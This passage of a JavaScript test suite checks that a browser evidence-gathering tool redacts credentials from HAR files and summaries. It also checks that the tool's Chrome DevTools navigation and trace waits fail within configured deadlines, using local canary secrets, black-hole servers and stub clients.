    assert(!isCredentialName(name), `redaction: '${name}' must NOT be treated as a credential (over-redaction costs evidence)`);
  }
  // ACCEPTED OVER-REDACTION, asserted so the direction is deliberate rather than accidental:
  // 'sortKeyName' splits into words that include 'key', so it is redacted. The names-based
  // test errs towards redacting an innocent value rather than leaving a credential, and the
  // artifact note says exactly that.
  for (const ambiguous of ['sortKeyName', 'code', 'key', 'redirectUriCode']) {
    assert(
      isCredentialName(ambiguous),
      `redaction: the names test errs towards over-redaction on ambiguous names, asserted for '${ambiguous}' (documented)`,
    );
  }

  // 3. Request bodies, form-encoded and JSON.
  const form = redactBodyText(`user=bob&password=${SECRET}&remember=1`);
  assert(!form.includes(SECRET) && form.includes('user=bob') && form.includes('remember=1'), `redaction: form body (${form})`);
  const json = redactBodyText(`{"api_key":"${SECRET}","page":2}`);
  assert(!json.includes(SECRET) && json.includes('"page":2'), `redaction: json body (${json})`);
  // An ESCAPED QUOTE inside the value used to end the match at the backslash, leaving the
  // rest of the credential in the recorded body. The whole string value must be replaced.
  const escaped = redactBodyText(`{"password":"head\\"${SECRET}tail","page":2}`);
  assert(!escaped.includes(SECRET), `redaction: a value containing an escaped quote must be redacted WHOLE (${escaped})`);
  assert(escaped.includes('"page":2'), `redaction: the field after an escaped-quote value must survive (${escaped})`);

  // 4. The redirect target: a Location can carry a credential in its query string.
  const loc = redactUrlCredentialValues(`/final?session=${SECRET}&ref=home`);
  assert(!loc.includes(SECRET) && loc.includes('ref=home'), `redaction: redirect target, RELATIVE form (${loc})`);
  const locAbs = redactUrlCredentialValues(`https://x.test/final?session=${SECRET}&ref=home`);
  assert(!locAbs.includes(SECRET) && locAbs.includes('ref=home'), `redaction: redirect target, ABSOLUTE form (${locAbs})`);

  // 5. Response body text when bodies are recorded.
  const resp = redactBodyText(`{"refresh_token":"${SECRET}","ok":true}`);
  assert(!resp.includes(SECRET) && resp.includes('"ok":true'), `redaction: response body text (${resp})`);

  // The header redaction is NOT regressed by any of this.
  const header = redactHeaderList([{ name: 'Set-Cookie', value: SECRET }, { name: 'Content-Type', value: 'text/html' }]);
  assert(header[0].value === '[redacted]' && header[1].value === 'text/html', `redaction: headers must still behave (${JSON.stringify(header)})`);

  // STRUCTURED JSON IS REDACTED BY DECODED KEY, BY CONSTRUCTION. Each of these leaked on the
  // previous revision: an ARRAY value (the scanner stopped at the bracket), a UNICODE-ESCAPED
  // key (the pattern could not see the decoded name), and a JS LINE CONTINUATION inside a
  // quoted value (the escape class did not consume a backslash-newline).
  const arr = redactBodyText(`{"token":["${SECRET}","other"]}`);
  assert(!arr.includes(SECRET), `redaction: a credential field holding an ARRAY must be redacted whole (${arr})`);
  assert(!arr.includes('other'), `redaction: the whole array goes with the field, so no element survives (${arr})`);
  const uni = redactBodyText(`{"tok\\u0065n":"${SECRET}","page":2}`);
  assert(!uni.includes(SECRET), `redaction: a UNICODE-ESCAPED credential key must be decoded and matched (${uni})`);
  assert(uni.includes('"page":2'), `redaction: a non-credential field beside it must survive (${uni})`);
  const cont = redactBodyText("var x = { password: 'head\\\n" + SECRET + "tail', page: 2 };");
  assert(!cont.includes(SECRET), `redaction: a JS LINE CONTINUATION inside the value must not end the match (${cont})`);

  // 7. TYPESCRIPT TYPE ANNOTATIONS (web-uplift-xwr). In `const apiKey: string = "secret"`
  //    the ':' after the key binds to the TYPE, not the value. The generic colon rule
  //    redacted the type token and left the secret in the artifact:
  //    'const apiKey: "[redacted]" = "secret123"'. .ts/.tsx trees are exactly what
  //    `dom --source` walks, so this was a live bypass, not a curiosity.
  const tsDecl = redactBodyText(`const apiKey: string = "${SECRET}";\nconst region: string = 'eu-west-1';`);
  assert(!tsDecl.includes(SECRET), `redaction: a TS annotation must not swallow the redaction - the value AFTER '=' is the secret (${tsDecl})`);
  assert(tsDecl.includes('string'), `redaction: the TYPE name is not a credential value and must survive (${tsDecl})`);
  assert(tsDecl.includes('eu-west-1'), `redaction: a non-credential annotated declaration must survive (${tsDecl})`);
  const tsNoSpace = redactBodyText(`let token:string='${SECRET}';`);
  assert(!tsNoSpace.includes(SECRET), `redaction: an annotation without spaces (${tsNoSpace})`);
  const tsUnion = redactBodyText(`const clientSecret: string | null = "${SECRET}";`);
  assert(!tsUnion.includes(SECRET), `redaction: a union-typed annotation (${tsUnion})`);

  // 8. PLURALIZED CREDENTIAL NAMES (web-uplift-xwr). CREDENTIAL_WORDS carries singulars,
  //    so isCredentialName('secrets'|'tokens'|'apiKeys') was false and {"secrets":{...}}
  //    walked through BOTH the structured and the heuristic pass untouched.
  for (const name of ['apiKeys', 'secrets', 'tokens', 'passwords', 'clientSecrets', 'accessTokens']) {
    assert(isCredentialName(name), `redaction: pluralized credential name '${name}' must be recognised`);
  }
  const pluralJson = redactBodyText(`{"secrets":{"db":"${SECRET}"},"tokens":["${SECRET}"],"page":2}`);
  assert(!pluralJson.includes(SECRET), `redaction: plural-named containers must be redacted whole (${pluralJson})`);
  assert(pluralJson.includes('"page":2'), `redaction: a non-credential field beside them must survive (${pluralJson})`);
  const pluralApiKeys = redactBodyText(`{"apiKeys":["${SECRET}"]}`);
  assert(!pluralApiKeys.includes(SECRET), `redaction: an apiKeys array (${pluralApiKeys})`);
  const pluralForm = redactBodyText(`user=bob&tokens=${SECRET}&remember=1`);
  assert(!pluralForm.includes(SECRET) && pluralForm.includes('user=bob'), `redaction: a plural name in a form body (${pluralForm})`);
  // DIRECTION CHECK: stemming must not turn innocent plurals into credentials.
  for (const name of ['colors', 'fonts', 'boxes', 'regions']) {
    assert(!isCredentialName(name), `redaction: innocent plural '${name}' must NOT be treated as a credential (over-redaction costs evidence)`);
  }

  // FIDELITY: the assertion that catches BOTH classes of corruption. The redacted body must be
  // byte-identical to the input EXCEPT at the redacted spans - so a body that still round-trips
  // with a credential in it fails, and so does a body that lost a field or changed a number.
  // Re-serialising used to drop a __proto__ field through the prototype setter and round a large
  // integer; the splice path must not.
  const proto = `{"__proto__":{"x":1},"token":"${SECRET}","big":9007199254740993,"page":2}`;
  const protoOut = redactBodyText(proto);
  assert(
    protoOut === `{"__proto__":{"x":1},"token":"[redacted]","big":9007199254740993,"page":2}`,
    `redaction: the body must differ from the input ONLY at the redacted span\n  in : ${proto}\n  out: ${protoOut}`,
  );
  assert(protoOut.includes('__proto__'), 'redaction: a __proto__ field must survive (re-serialising dropped it through the prototype setter)');
  assert(protoOut.includes('9007199254740993'), 'redaction: an integer beyond the safe range must survive unchanged (re-serialising rounded it)');
  const cleanBody = '{"page":2,"big":9007199254740993}';
  assert(redactBodyText(cleanBody) === cleanBody, 'redaction: a body with no credential-named field must be recorded byte-identical');
  const arrIn = `{"token":["${SECRET}","other"],"page":2}`;
  assert(
    redactBodyText(arrIn) === '{"token":"[redacted]","page":2}',
    `redaction: an array value is replaced at its own span and nothing else moves (${redactBodyText(arrIn)})`,
  );

  // NESTING IS COVERED BY CONSTRUCTION - and this is the exact-string assertion that proves it.
  // The walker used to jump to the end of a NON-credential key's value unconditionally, which
  // skipped an entire container instead of descending into it, so a nested credential survived
  // unchanged (and the valid-JSON path returned it, so the heuristic never saw it). Each of
  // these compares the WHOLE string, so a missed redaction and a corrupted body both fail.
  const nestedObj = `{"outer":{"token":"${SECRET}","keep":1},"page":2}`;
  assert(
    redactBodyText(nestedObj) === '{"outer":{"token":"[redacted]","keep":1},"page":2}',
    `redaction: a credential NESTED in an object must be redacted with every other byte preserved (${redactBodyText(nestedObj)})`,
  );
  const nestedArr = `{"list":[{"apiKey":"${SECRET}","n":1},{"n":2}],"page":2}`;
  assert(
    redactBodyText(nestedArr) === '{"list":[{"apiKey":"[redacted]","n":1},{"n":2}],"page":2}',
    `redaction: a credential NESTED in an array of objects must be redacted with every other byte preserved (${redactBodyText(nestedArr)})`,
  );
  const multi = `{"token":"${SECRET}","outer":{"password":"${SECRET}"},"page":2}`;
  assert(
    redactBodyText(multi) === '{"token":"[redacted]","outer":{"password":"[redacted]"},"page":2}',
    `redaction: MULTIPLE credential keys, at least one nested, must all be redacted (${redactBodyText(multi)})`,
  );

  // THE DOCUMENTED GAPS, asserted so they cannot be mistaken for coverage later:
  // a base64-encoded body is not text-searchable, and a credential whose name does not
  // look like one is not detected. Both are stated in the artifact's own note.
  const b64 = Buffer.from(`password=${SECRET}`).toString('base64');
  assert(redactBodyText(b64) === b64, 'redaction: a base64-encoded body is left untouched - a KNOWN GAP, since base64 is not text-searchable');
  assert(
    Buffer.from(redactBodyText(b64), 'base64').toString('utf8').includes(SECRET),
    'redaction: and the credential is still RECOVERABLE from that body by decoding it - asserted so the artifact note states the gap instead of claiming coverage',
  );
  assert(redactBodyText('page=2&q=hello') === 'page=2&q=hello', 'redaction: text with no credential-named field must be untouched');
  assert(isCredentialName('api_key') && isCredentialName('Set-Cookie') === false && isCredentialName('page') === false, 'redaction: the names-based test itself');
}

// The integration half: a REAL har run over a local page, so the wiring is exercised and
// not just the helpers. One browser launch covers every vector in the artifact.
async function testHarCredentialRedaction() {
  const SECRET = 'SECRET-CANARY-456';
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/redir') {
      res.writeHead(302, { Location: `/final?session=${SECRET}` });
      res.end('redirecting');
      return;
    }
    if (path === '/api') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(`{"refresh_token":"${SECRET}","ok":true}`);
      return;
    }
    if (path === '/final') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(`{"refresh_token":"${SECRET}","ok":true}`);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><title>t</title><link rel="icon" href="data:,">
      <script>
        fetch('/api?api_key=${SECRET}', { method: 'POST', headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ password: '${SECRET}', page: 2 }) });
        fetch('/redir');
      </script>ok`);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const { port } = server.address();
    const base = join(tmp, `dsj-har-${Math.random().toString(36).slice(2)}`);
    mkdirSync(base, { recursive: true });
    const out = join(base, 'network.har');
    await gather('har', `http://127.0.0.1:${port}/?token=${SECRET}&page=2`, { quiet: true, wait: 2500, bodies: true, out });

    const raw = readFileSync(out, 'utf8');
    assert(!raw.includes(SECRET), 'dsj har: the credential must not appear anywhere in the raw HAR');

    const entries = JSON.parse(raw).log.entries;
    const withToken = entries.find((e) => (e.request.url || '').includes('token='));
    assert(withToken, 'dsj har: the entry carrying the token parameter must be present');
    assert(withToken.request.url.includes('token=%5Bredacted%5D') || withToken.request.url.includes('token=[redacted]'), `dsj har: the request URL parameter must be redacted (${withToken.request.url})`);
    assert(withToken.request.url.includes('page=2'), `dsj har: a non-credential parameter in the same URL must survive (${withToken.request.url})`);
    const qs = (withToken.request.queryString || []).map((q) => `${q.name}=${q.value}`);
    assert(qs.includes('token=[redacted]') && qs.includes('page=2'), `dsj har: the parsed queryString must redact one and keep the other (${JSON.stringify(qs)})`);

    const postEntry = entries.find((e) => e.request.postData && e.request.postData.text);
    assert(postEntry, 'dsj har: the POST entry must be present (the body vector)');
    assert(!postEntry.request.postData.text.includes(SECRET), `dsj har: the request body must be redacted (${postEntry.request.postData.text})`);
    assert(postEntry.request.postData.text.includes('"page":2'), `dsj har: a non-credential body field must survive (${postEntry.request.postData.text})`);
    assert(postEntry.request.bodySize === Buffer.byteLength(postEntry.request.postData.text), 'dsj har: bodySize must describe the REDACTED text, not the original secret length');
    // and the wire lengths are NOT adjusted - the note says so, so assert the gap is real
    assert(typeof postEntry.response?.bodySize === 'number', 'dsj har: response wire sizes remain measurements (a stated gap, not a hidden one)');

    const redirectEntry = entries.find((e) => (e.response?.status === 302));
    assert(redirectEntry, 'dsj har: the redirect entry must be present');
    assert(!String(redirectEntry.response.redirectURL).includes(SECRET), `dsj har: the redirect target must be redacted (${redirectEntry.response.redirectURL})`);

    const bodyEntry = entries.find((e) => (e.response?.content?.text || '').includes('[redacted]'));
    assert(bodyEntry, 'dsj har: a recorded response body carrying a credential-named field must be redacted (--bodies path)');
    assert(!entries.some((e) => (e.response?.content?.text || '').includes(SECRET)), 'dsj har: no recorded response body may still carry the credential');
    // The note claims the WIRE sizes still measure the ORIGINAL bytes, so assert exactly that:
    // had either been recomputed from the redacted text it would be SHORTER, and this fails.
    // Compare WITHIN the same entry: bodySize is the wire measurement of the ORIGINAL body,
    // the recorded text is the redacted one, and for an uncompressed response the former is
    // longer. An implementation that recomputed bodySize from the redacted text fails here.
    const redactedLen = Buffer.byteLength(postEntry.response?.content?.text || '');
    assert(
      typeof postEntry.response?.bodySize === 'number' && postEntry.response.bodySize > redactedLen,
      `dsj har: response bodySize must remain the ORIGINAL wire measurement, not a recomputed one (wire ${postEntry.response?.bodySize}, redacted ${redactedLen})`,
    );
    assert(
      typeof postEntry.response?._transferSize === 'number' && postEntry.response._transferSize > redactedLen,
      `dsj har: _transferSize must remain the ORIGINAL wire measurement too (transfer ${postEntry.response?._transferSize}, redacted ${redactedLen})`,
    );

    // THE TWO VECTORS THIS TEST FOUND ITSELF, one call site further out than the bead's
    // list: URL-valued headers (Referer carries the audited page URL verbatim) and the
    // initiator fields (the inserting document and the JS call-frame URL, which is the page
    // URL when a script started the request).
    const refererEntry = entries.find((e) =>
      (e.request.headers || []).some((h) => String(h.name).toLowerCase() === 'referer' && String(h.value).includes('token=')));
    assert(refererEntry, 'dsj har: an entry whose Referer carries the token URL must be present (otherwise this vector is untested)');
    assert(
      !JSON.stringify(refererEntry.request.headers).includes(SECRET),
      'dsj har: the Referer header must not carry the credential',
    );
    // POSITIVE FIRST, or the absence assertion cannot show an initiator-specific failure:
    // the fixture must demonstrably have carried the parameter in an initiator URL, and the
    // redaction must have replaced its VALUE while keeping the name.
    // URL.toString() percent-encodes the brackets, so accept both renderings.
    const carried = (v) => /token=(\[redacted\]|%5Bredacted%5D)/i.test(String(v || ''));
    const initiatorCarried = entries.some((e) => carried(e._initiator?.url) || carried(e._initiator?.callFrame?.url));
    assert(initiatorCarried, 'dsj har: an initiator URL must have carried the token parameter and been cleaned (otherwise this vector is untested)');
    assert(
      !entries.some((e) => String(e._initiator?.url || '').includes(SECRET) || String(e._initiator?.callFrame?.url || '').includes(SECRET)),
      'dsj har: neither initiator field may carry the credential',
    );

    const summary = JSON.parse(readFileSync(join(base, 'network-summary.json'), 'utf8'));
    const summaryRaw = JSON.stringify(summary);
    assert(!summaryRaw.includes(SECRET), 'dsj har: the model-readable summary must not re-leak what the HAR redacted');
    const redir = (summary.hygiene?.redirects || []).find((r) => r.status === 302);
    assert(redir && !String(redir.location).includes(SECRET), `dsj har: the summary redirect target must be redacted (${JSON.stringify(redir)})`);
  } finally {
    server.close();
  }
}

// web-uplift-17o: a starved host can leave the browser never answering, and until the CDP
// deadline landed the evidence CLI waited INDEFINITELY (the dl6 reproduction). The honest
// evidence is a BOUNDED REPRODUCTION of the wait, not an assertion that a timeout constant
// exists: a server that accepts connections and never responds is the starvation condition
// itself (the load event never fires), and the navigation must fail loudly within the order
// of the deadline, naming the URL, the bound and how to raise it.
async function testCdpDeadline() {
  const { withDeadline, launchChrome, newSession, navigate } = await import(
    pathToFileURL(join(repoRoot, 'evidence/cdp.mjs')).href
  );

  // THE MECHANISM, directly: a promise that never settles must reject within the bound,
  const t0 = Date.now();
  let mechErr = null;
  try {
    await withDeadline(new Promise(() => {}), 120, 'the test wait');
  } catch (e) {
    mechErr = e;
  }
  assert(
    mechErr && mechErr.message.includes('timed out after 120ms waiting for the test wait'),
    `17o deadline: a never-settling wait must reject with the loud text (${mechErr && mechErr.message})`,
  );
  assert(
    mechErr && mechErr.message.includes('--cdp-deadline'),
    '17o deadline: the error must say how to raise the bound',
  );
  assert(
    Date.now() - t0 < 5000,
    `17o deadline: the rejection must arrive at the order of the bound, not the suite timeout (${Date.now() - t0}ms)`,
  );
  // and a promise that settles must pass through undisturbed.
  assert(
    (await withDeadline(Promise.resolve(42), 120, 'a settled wait')) === 42,
    '17o deadline: a settling promise must pass through',
  );

  // --out naming a directory (or a path with a missing parent) must fail LOUDLY AND FAST,
  // before any browser is launched - the raw EISDIR used to surface from writeFileSync
  // mid-run and read as a tool bug.
  const healthy = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<!doctype html><title>ok</title><p>healthy</p>');
  });
  await new Promise((res) => healthy.listen(0, '127.0.0.1', res));
  const page = `http://127.0.0.1:${healthy.address().port}/`;
  const t1 = Date.now();
  const badOut = run(process.execPath, ['evidence/cli.mjs', 'dom', page, '--out', tmp]);
  assert(badOut.status !== 0, `17o --out: a directory must be rejected (exit ${badOut.status})`);
  assert(
    (badOut.stderr || '').includes('must be a file path') && (badOut.stderr || '').includes(tmp),
    `17o --out: the error must name the path (${badOut.stderr})`,
  );
  assert(
    !(badOut.stderr || '').includes('[browser] launching'),
    `17o --out: the rejection must precede any browser launch, asserted by the ABSENCE of the launch diagnostic, not inferred from elapsed time (${badOut.stderr})`,
  );
  const missingParent = run(process.execPath, ['evidence/cli.mjs', 'dom', page, '--out', join(tmp, 'no-such-dir', 'x.json')]);
  assert(
    missingParent.status !== 0 && (missingParent.stderr || '').includes('does not exist'),
    `17o --out: a missing parent directory must be rejected loudly (${missingParent.stderr})`,
  );
  assert(
    !(missingParent.stderr || '').includes('[browser] launching'),
    '17o --out: the missing-parent rejection must also precede any browser launch (absence of the launch diagnostic)',
  );

  // THE REAL PATH: a server that accepts connections and never answers. The first
  // navigation (about:blank) completes; the second load event never fires, and the
  // deadline must turn an indefinite hang into a loud, bounded failure.
  const sockets = new Set();
  // The handler firing IS the proof the target was contacted: a deadline that fires BEFORE
  // the target navigation (e.g. on the about:blank pre-step under load) leaves this at zero,
  // and the starved assertions below REQUIRE it to have increased - otherwise the test would
  // pass without ever reproducing the starvation it claims to reproduce.
  let blackholeHits = 0;
  const blackhole = http.createServer(() => {
    blackholeHits += 1;
    /* accept and never answer */
  });
  blackhole.on('connection', (sock) => {
    sockets.add(sock);
    sock.on('close', () => sockets.delete(sock));
  });
  await new Promise((res) => blackhole.listen(0, '127.0.0.1', res));
  const chrome = await launchChrome({ log: () => {} });
  try {
    const session = await newSession(chrome.port, { log: () => {} });
    try {
      const starvedUrl = `http://127.0.0.1:${blackhole.address().port}/`;
      const hitsBeforeNav = blackholeHits;
      const t2 = Date.now();
      let navErr = null;
      try {
        // 1500ms, not a few hundred: under fleet load the about:blank pre-step alone can
        // exceed a very small deadline (observed in the first gate run), and the bound must
        // survive that while still firing promptly on the never-responding target. Every
        // step's message names the ultimate target URL, so the assertion holds whichever
        // step the bound fires on - and the run is bounded either way, which is the claim.
        await navigate(session.client, starvedUrl, { settleMs: 0, navigationDeadlineMs: 1500 });
      } catch (e) {
        navErr = e;
      }
      const elapsed = Date.now() - t2;
      assert(
        navErr && navErr.message.includes('timed out after 1500ms'),
        `17o: a starved navigation must fail loudly with the bound (${navErr && navErr.message})`,
      );
      assert(
        navErr &&
          (navErr.message.includes(`the load event for ${starvedUrl}`) ||
            navErr.message.includes(`the navigation to ${starvedUrl}`)),
        `17o: the failure must identify the TARGET wait, not the about:blank pre-step (${navErr && navErr.message})`,
      );
      assert(
        blackholeHits > hitsBeforeNav,
        `17o: the black-hole server must have been CONTACTED (hits ${hitsBeforeNav} -> ${blackholeHits}) - otherwise the starvation was never reached and this test proves nothing`,
      );
      assert(
        elapsed < 15000,
        `17o: the starved navigation must return at the order of the deadline, not the suite timeout (${elapsed}ms)`,
      );
      // CONTROL: the same navigation with a generous deadline against a healthy server must
      // complete, so the bound is not just always-failing.
      let controlErr = null;
      try {
        await navigate(session.client, page, { settleMs: 0, navigationDeadlineMs: 20000 });
      } catch (e) {
        controlErr = e;
      }
      assert(
        !controlErr,
        `17o control: a healthy navigation under a generous deadline must complete (${controlErr && controlErr.message})`,
      );
    } finally {
      await session.close();
    }
  } finally {
    await chrome.close();
  }

  // THE TRACE PATH, reproduced the same way: the trace primitive navigates DIRECTLY (it
  // must start tracing before navigationStart), and before this revision its load wait had
  // no bound at all - the hole found while writing the residual note. Driven IN-PROCESS via
  // gather() (the suite's convention, as the har tests do it): a CLI child cannot be used
  // here because spawnSync blocks this process's event loop, which would freeze the test's
  // own servers - observed directly: SERVER HITS 0 and a 30s timeout on a healthy page.
  // The deadline is set through the same module state the CLI flag writes, and RESTORED in
  // the finally so the rest of the suite keeps the production defaults.
  // COVERAGE, STATED PRECISELY SO IT DOES NOT OVERCLAIM: this case reproduces a PAGE-side
  // stall (the server never answers, so the navigation and load waits must fire their
  // bounds). The mechanism itself is unit-tested (a never-settling promise rejects within
  // the bound; a settling one passes through), and the tracing call sites are enumerated and
  // code-covered. This case CANNOT fire the tracingComplete / Tracing.end bounds - those
  // are answered by the BROWSER, not the page, so a never-responding server never reaches
  // them; their firing is demonstrated by the STUB-CLIENT cases below (web-uplift-4ux).
  // What remains unreproduced is a REAL wedged browser mid-trace (a frozen Chrome on a
  // live socket): wedging a real browser takes an OS-level freeze or a stalling proxy on
  // the CDP port, and the stubs below already reproduce its observable failure - the
  // event never arrives, the command is never acked - in-process, with no browser to
  // wedge and no flake, so the real wedge stays out of the suite.
  const { gather, trace } = await import(pathToFileURL(join(repoRoot, 'evidence/cli.mjs')).href);
  const { configureCdpDeadlines } = await import(pathToFileURL(join(repoRoot, 'evidence/cdp.mjs')).href);
  const bhUrl = `http://127.0.0.1:${blackhole.address().port}/`;
  const hitsBeforeTrace = blackholeHits;
  try {
    configureCdpDeadlines({ navigationMs: 4000, callMs: 4000 });
    const t3 = Date.now();
    let traceErr = null;
    try {
      await gather('trace', bhUrl, { quiet: true, wait: 100, out: join(tmp, 'trace-starved.json') });
    } catch (e) {
      traceErr = e;
    }
    const traceElapsed = Date.now() - t3;
    assert(
      traceErr && traceErr.message.includes('timed out after 4000ms'),
      `17o trace: a starved trace must fail loudly with the bound (${traceErr && traceErr.message})`,
    );
    assert(
      traceErr &&
        (traceErr.message.includes(`the load event for ${bhUrl}`) ||
          traceErr.message.includes(`the navigation to ${bhUrl}`)),
      `17o trace: the failure must identify the TARGET wait, not the about:blank pre-step (${traceErr && traceErr.message})`,
    );
    assert(
      blackholeHits > hitsBeforeTrace,
      `17o trace: the black-hole server must have been CONTACTED (hits ${hitsBeforeTrace} -> ${blackholeHits}) - otherwise the starvation was never reached`,
    );
    assert(
      traceElapsed < 30000,
      `17o trace: the starved trace must return at the order of the deadline, not the suite timeout (${traceElapsed}ms)`,
    );
  } finally {
    configureCdpDeadlines({ navigationMs: 30000, callMs: 30000 });
  }
  // HEALTHY CONTROL for the same primitive: a wrap added to a real primitive whose
  // generous-deadline behaviour is not asserted would let the fix break the primitive
  // silently, and trace is user-visible - so it must still succeed when healthy.
  let healthyTraceErr = null;
  try {
    await gather('trace', page, { quiet: true, wait: 200, out: join(tmp, 'trace-ok.json') });
  } catch (e) {
    healthyTraceErr = e;
  }
  assert(
    !healthyTraceErr && existsSync(join(tmp, 'trace-ok.json')),
    `17o trace control: a healthy trace under the default deadline must complete and write its artifact (${healthyTraceErr && healthyTraceErr.message})`,
  );
  // web-uplift-4ux: STUB FIRING REPRO for the two tracing bounds of the trace path. The
  // starved case above stalls the PAGE side, which fires the load-event bound before the
  // browser is ever asked to answer the two tracing waits. These cases drive the exported
  // trace() directly with a fake client: no browser exists in these cases, and every
  // await on the path is either withDeadline-wrapped or a fixed sleep(), so no stub-side
  // wait can be unbounded - the bound-firing cases EXPECT the deadline rejection (the
  // healthy control would fail loudly instead). What the stubs demonstrate: the
  // tracing-COMPLETE bound fires with the actionable error when the event never arrives,
  // the tracing-END bound fires when the command is never acked, and the healthy control
  // writes both artifacts when the event does arrive. What they do NOT demonstrate: a real
  // wedged browser mid-trace (see the coverage note above - deliberately out of the suite).
  const stubClient = ({ completeFires, endResolves }) => ({
    Page: {
      navigate: async () => ({}),
      loadEventFired: () => Promise.resolve({ timestamp: 0 }),
    },
    Tracing: {
      dataCollected: () => {},
      start: async () => ({}),
      end: endResolves ? async () => ({}) : () => new Promise(() => {}),
      tracingComplete: (cb) => {
        if (completeFires) setTimeout(() => cb({ dataLossInfo: [] }), 0);
      },
    },
  });
  const STUB_DEADLINE_MS = 300;
  const stubUrl = 'http://stub.invalid/';
  // TEST-OWNED TIMEOUT, and why it is NOT redundant - do not remove it: the assertions
  // below must be able to FAIL ON THEIR OWN. The stub promises behind the two failure
  // cases never settle, so if the production bound were ever removed or broken, awaiting
  // trace() directly would HANG the suite (the runner has no timeout of its own) - and a
  // guard that cannot report the exact regression it exists to catch is not a control.
  // Each failure-case call therefore races a test deadline set comfortably above the
  // production bound, so the two cannot be confused: bound present -> the production
  // rejection wins the race and the assertions check its text; bound absent -> the test
  // deadline wins and the case fails BY ASSERTION within TEST_OWNED_TIMEOUT_MS, naming
  // which bound never rejected.
  const TEST_OWNED_TIMEOUT_MS = 5000;
  const withTestTimeout = (call, boundName) => {
    let timer = null;
    return Promise.race([
      call,
      new Promise((_, rejectTest) => {
        timer = setTimeout(
          () =>
            rejectTest(
              new Error(
                `4ux stub: TEST-OWNED TIMEOUT - the production bound (${boundName}) did not reject within ${TEST_OWNED_TIMEOUT_MS}ms; without it this call never settles and the suite would hang`,
              ),
            ),
          TEST_OWNED_TIMEOUT_MS,
        );
      }),
    ]).finally(() => clearTimeout(timer));
  };
  try {
    configureCdpDeadlines({ navigationMs: STUB_DEADLINE_MS, callMs: STUB_DEADLINE_MS });
    // (a) the tracing-complete event never arrives -> that bound must fire.
    const t4 = Date.now();
    let completeErr = null;
    try {
      await withTestTimeout(
        trace(
          stubClient({ completeFires: false, endResolves: true }),
          stubUrl,
          { wait: 0, out: join(tmp, 'trace-stub-complete.json') },
          () => {},
        ),
        'the trace-to-complete bound',
      );
    } catch (e) {
      completeErr = e;
    }
    const completeElapsed = Date.now() - t4;
    assert(
      completeErr &&
        completeErr.message.includes(`timed out after ${STUB_DEADLINE_MS}ms waiting for the trace to complete for ${stubUrl}`),
      `4ux stub: a tracing-complete event that never arrives must fire the bound with the actionable text (${completeErr && completeErr.message})`,
    );
    assert(
      completeErr && completeErr.message.includes('--cdp-deadline'),
      '4ux stub: the rejection must say how to raise the bound',
    );
    assert(
      !existsSync(join(tmp, 'trace-stub-complete.json')),
      '4ux stub: a starved stub trace must not write an artifact',
    );
    assert(
      completeElapsed < 10000,
      `4ux stub: the rejection must arrive at the order of the bound, not the suite timeout (${completeElapsed}ms)`,
    );
    // (b) Tracing.end is never acked -> the end bound must fire (the complete wait is never reached).
    let endErr = null;
    try {
      await withTestTimeout(
        trace(
          stubClient({ completeFires: false, endResolves: false }),
          stubUrl,
          { wait: 0, out: join(tmp, 'trace-stub-end.json') },
          () => {},
        ),
        'the browser-to-end-tracing bound',
      );
    } catch (e) {
      endErr = e;
    }
    assert(
      endErr &&
        endErr.message.includes(`timed out after ${STUB_DEADLINE_MS}ms waiting for the browser to end tracing for ${stubUrl}`),
      `4ux stub: an unacked Tracing.end must fire its own bound (${endErr && endErr.message})`,
    );
    // (c) HEALTHY CONTROL: same stub, event fires -> trace completes and writes both
    // artifacts. The control races a setTimeout(0) against the bound, so it gets a
    // GENEROUS deadline: the small bound above is for the firing cases only, and a tiny
    // deadline under fleet load is a known flake shape in this suite.
    configureCdpDeadlines({ navigationMs: 10000, callMs: 10000 });
    const stubOkOut = join(tmp, 'trace-stub-ok.json');
    const stubOk = await trace(
      stubClient({ completeFires: true, endResolves: true }),
      stubUrl,
      { wait: 0, out: stubOkOut },
      () => {},
    );
    assert(
      existsSync(stubOkOut) && existsSync(join(tmp, 'trace-stub-ok-summary.json')),
      '4ux stub control: a healthy stub trace must write the raw trace and the summary artifacts',
    );
    assert(
      stubOk && stubOk.eventCount === 0 && stubOk.mainThread && stubOk.summaryArtifact,
      `4ux stub control: the summary must be returned even with zero events (${JSON.stringify(stubOk).slice(0, 200)})`,
    );
  } finally {
    configureCdpDeadlines({ navigationMs: 30000, callMs: 30000 });
  }
  // RESILIENCE: its initial load goes through navigate() (bounded above), and its offline
  // reload is wrapped with its own offlineBudget; the suite's existing resilience tests
  // drive the primitive healthy against a local server, including that reload - so the
  // healthy control for this wrap already exists in the suite rather than being duplicated.
  blackhole.close();
  for (const sock of sockets) sock.destroy();
  healthy.close();
}

// web-uplift-17o, the census ENFORCED. The completeness claim is arithmetic, and this test is
// what keeps it true rather than read: every non-comment await line in the two evidence files
// must match exactly one disposition rule below, and each rule's count must equal its
// expectation. A NEW await that matches nothing fails HERE, naming the file, the line number
// and the text, so the next author classifies it (bounds it, or records the exclusion with
// its reason) in the census comment next to withDeadline in evidence/cdp.mjs - and a
// classification that drifts fails the same way. The expected counts live here, not in
// prose, so this is the one authoritative list; the comment summarises and points here.
function testAwaitCensus() {
  // The rules match the ACTUAL bounded call sites, not shapes that merely look bounded: the
  // fetch rule requires the AbortSignal on the same line, so removing the signal leaves the
  // site UNCLASSIFIED (loud) rather than still "bounded"; and the primitive dispatch is
  // excluded, because it can run the unbounded content probes. Each site must match EXACTLY
  // ONE rule (checked below): first-match-permissive is how a dispatch got called bounded.
  // THE CENSUS'S LIMIT, stated plainly: it verifies that every site is CLASSIFIED. It cannot
  // verify that a bound is still PRESENT at a classified site - that is what review and the
  // targeted tests are for.
  const rules = [
    ['bounded:withDeadline', /await withDeadline\(|await withRetry\(/],
    ['bounded:navigate-helper', /await navigate\(/],
    ['bounded:transitive-caller-wraps', /await client\.Emulation\.(setEmulatedMedia|setDeviceMetricsOverride|setCPUThrottlingRate|setLocaleOverride|setTimezoneOverride)|await client\.Network\.emulateNetworkConditions|await client\.ServiceWorker\.enable/],
    ['bounded:sleep', /await sleep\(|await new Promise\(\(r\) => setTimeout/],
